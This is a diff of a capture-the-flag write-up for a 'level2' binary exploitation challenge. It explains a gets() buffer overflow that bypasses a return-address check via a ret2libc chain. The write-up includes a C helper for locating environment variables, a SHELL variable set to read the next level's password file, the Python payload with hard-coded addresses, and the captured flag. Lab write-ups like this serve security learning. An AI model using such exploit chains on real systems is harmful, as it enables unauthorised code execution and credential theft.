@@ -1,8 +1,23 @@
-export SHELL="///bin/sh -c 'cat /home/user/level3/.pass'"
-./a.out SHELL
-0xbffff8ec
-python -c "print 'A' * 80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7' + 'yaya' + '\xec\xf8\xff\xbf'" > /tmp/file
-cat /tmp/file - | ./level2
+In this level, the program also uses gets but checks the return address after calling gets, if the highest byte is equal to b (which can mean that we are trying to call for example system (0xb0e6b73e))
+if it's the case then the program prints the corrupted return address and exit
+to avoid this, we can give the correct return address and provide the desired return address (system) after it
+and then give system a string to call so that it prints the flag
+
+
+we can set the string in an env variable and get its address by this program:
+
+#include <stdio.h>
+int main(int argc, char *argv[]) {
+	printf("%p\n", getenv(argv[1]));
+	return 0;
+}
+
+gcc -o levelx f.c
+export SHELL="/bin/sh -c 'cat /home/user/level3/.pass'"
+~$ ./levelx SHELL
+0xbffff8f8
+finally we ran this payload:
+~$ ./level2 <<< $(python -c "print 'A' * 80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7' + 'yaya' + '\xf8\xf8\xff\xbf'")
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��yaya����
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 Segmentation fault (core dumped)
